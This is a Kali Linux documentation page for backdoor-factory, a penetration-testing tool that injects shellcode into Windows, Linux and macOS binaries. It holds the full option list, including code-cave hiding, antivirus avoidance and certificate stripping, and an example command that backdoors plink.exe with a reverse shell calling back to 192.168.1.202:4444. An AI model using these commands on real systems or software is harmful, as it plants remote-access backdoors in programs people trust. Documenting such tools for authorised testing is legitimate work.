---
Title: backdoor-factory
Homepage: https://github.com/secretsquirrel/the-backdoor-factory
Repository: https://salsa.debian.org/pkg-security-team/backdoor-factory
Architectures: all
Version: 3.4.2+dfsg-5
Metapackages: kali-linux-everything kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-social-engineering 
Icon: images/backdoor-factory-logo.svg
PackagesInfo: |
 ### backdoor-factory
 
  Injects shellcode into win32/64 PE files, 32/64bits ELF binaries, to continue
  normal file execution (if the shellcode supports it), by patching the exe/dll
  directly.
   
  Some executables have built in protections, as such this will not work on all
  ELF/PE files. It is advisable that you test target ELF/PE files before
  deploying them to clients or using them in exercises
 
 **Installed size:** `735 KB`  
 **How to install:** `sudo apt install backdoor-factory`  
 
 {{< spoiler "Dependencies:" >}}
 * curl
 * osslsigncode
 * python3
 * python3-capstone 
 * python3-pefile
 * python3-pkg-resources 
 {{< /spoiler >}}
 
 ##### backdoor-factory
 
 Inject predefined or user-defined shellcode in binaries
 
 ```
 root@kali:~# backdoor-factory -h
 Usage: backdoor-factory [options]
 
 Options:
   -h, --help            show this help message and exit
   -f FILE, --file=FILE  File to backdoor
   -s SHELL, --shell=SHELL
                         Payloads that are available for use. Use 'show' to see
                         payloads.
   -H HOST, --hostip=HOST
                         IP of the C2 for reverse connections.
   -P PORT, --port=PORT  The port to either connect back to for reverse shells
                         or to listen on for bind shells
   -J, --cave_jumping    Select this options if you want to use code cave
                         jumping to further hide your shellcode in the binary.
   -a, --add_new_section
                         Mandating that a new section be added to the exe
                         (better success) but less av avoidance
   -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
                         User supplied shellcode, make sure that it matches the
                         architecture that you are targeting.
   -c, --cave            The cave flag will find code caves that can be used
                         for stashing shellcode. This will print to all the
                         code caves of a specific size.The -l flag can be use
                         with this setting.
   -l SHELL_LEN, --shell_length=SHELL_LEN
                         For use with -c to help find code caves of different
                         sizes
   -o OUTPUT, --output-file=OUTPUT
                         The backdoor output file
   -n NSECTION, --section=NSECTION
                         New section name must be less than seven characters
   -d DIR, --directory=DIR
                         This is the location of the files that you want to
                         backdoor. You can make a directory of file backdooring
                         faster by forcing the attaching of a codecave to the
                         exe by using the -a setting.
   -w, --change_access   This flag changes the section that houses the codecave
                         to RWE. Sometimes this is necessary. Enabled by
                         default. If disabled, the backdoor may fail.
   -i, --injector        This command turns the backdoor factory in a hunt and
                         shellcode inject type of mechanism. Edit the target
                         settings in the injector module.
   -u SUFFIX, --suffix=SUFFIX
                         For use with injector, places a suffix on the original
                         file for easy recovery
   -D, --delete_original
                         For use with injector module.  This command deletes
                         the original file.  Not for use in production systems.
                         *Author not responsible for stupid uses.*
   -O DISK_OFFSET, --disk_offset=DISK_OFFSET
                         Starting point on disk offset, in bytes. Some authors
                         want to obfuscate their on disk offset to avoid
                         reverse engineering, if you find one of those files
                         use this flag, after you find the offset.
   -S, --support_check   To determine if the file is supported by BDF prior to
                         backdooring the file. For use by itself or with
                         verbose. This check happens automatically if the
                         backdooring is attempted.
   -M, --cave-miner      Future use, to help determine smallest shellcode
                         possible in a PE file
   -q, --no_banner       Kills the banner.
   -v, --verbose         For debug information output.
   -T IMAGE_TYPE, --image-type=IMAGE_TYPE
                         ALL, x86, or x64 type binaries only. Default=ALL
   -Z, --zero_cert       Allows for the overwriting of the pointer to the PE
                         certificate table effectively removing the certificate
                         from the binary for all intents and purposes.
   -R, --runas_admin     EXPERIMENTAL Checks the PE binaries for
                         'requestedExecutionLevel level="highestAvailable"'. If
                         this string is included in the binary, it must run as
                         system/admin. If not in Support Check mode it will
                         attmept to patch highestAvailable into the manifest if
                         requestedExecutionLevel entry exists.
   -L, --patch_dll       Use this setting if you DON'T want to patch DLLs.
                         Patches by default.
   -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY
                         For MACH-O format. If fat file, focus on which arch to
                         patch. Default is x64. To force x86 use -F x86, to
                         force both archs use -F ALL.
   -B BEACON, --beacon=BEACON
                         For payloads that have the ability to beacon out, set
                         the time in secs
   -m PATCH_METHOD, --patch-method=PATCH_METHOD
                         Patching methods for PE files, 'manual','automatic',
                         replace and onionduke
   -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY
                         For onionduke. Provide your desired binary.
   -X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X
                         to support XP. By default the binary will crash on XP
                         machines (e.g. sandboxes)
   -A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table
                         is created in a new section, by calling this flag it
                         will be put in a code cave.  This can cause bianry
                         failure is some cases. Test on target binaries first.
   -C, --code_sign       For those with codesigning certs wishing to sign PE
                         binaries only. Name your signing key and private key
                         signingcert.cer and signingPrivateKey.pem repectively
                         in the certs directory it's up to you to obtain
                         signing certs.
   -p, --preprocess      To execute preprocessing scripts in the preprocess
                         directory
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## backdoor-factory Usage Example

Specify the binary to backdoor (`-f /usr/share/windows-binaries/plink.exe`), set the connect-back IP (`-H 192.168.1.202`), the connect-back port (`-P 4444`), and the shell to use (`-s reverse_shell_tcp`):

```
root@kali:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline
    ____  ____  ______           __
   / __ )/ __ \/ ____/___ ______/ /_____  _______  __
  / __  / / / / /_  / __ `/ ___/ __/ __ \/ ___/ / / /
 / /_/ / /_/ / __/ / /_/ / /__/ /_/ /_/ / /  / /_/ /
/_____/_____/_/    \__,_/\___/\__/\____/_/   \__, /
                                            /____/

         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @midnite_runr
         IRC:       freenode.net #BDFactory

         Version:   3.4.2

[*] In the backdoor module
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win32 entry instructions
[*] Looking for and setting selected shellcode
[*] Creating win32 resume execution stub
[*] Looking for caves that will fit the minimum shellcode length of 367
[*] All caves lengths:  367
############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? Use jump, single, append, or ignore.**
############################################################
[*] Cave 1 length as int: 367
[*] Available caves:
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x284 End: 0xffc; Cave Size: 3448
2. Section Name: .text; Section Begin: 0x1000 End: 0x37000; Cave begin: 0x36985 End: 0x36ffc; Cave Size: 1655
3. Section Name: .rdata; Section Begin: 0x37000 End: 0x48000; Cave begin: 0x47cf0 End: 0x48000; Cave Size: 784
4. Section Name: .data; Section Begin: 0x48000 End: 0x4a000; Cave begin: 0x48965 End: 0x48b8c; Cave Size: 551
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x49080 End: 0x4a00a; Cave Size: 3978
**************************************************
[!] Enter your selection: 2
[!] Using selection: 2
[*] Changing flags for section: .text
[*] Patching initial entry instructions
[*] Creating win32 resume execution stub
[*] Looking for and setting selected shellcode
File plink.exe is in the 'backdoored' directory
```
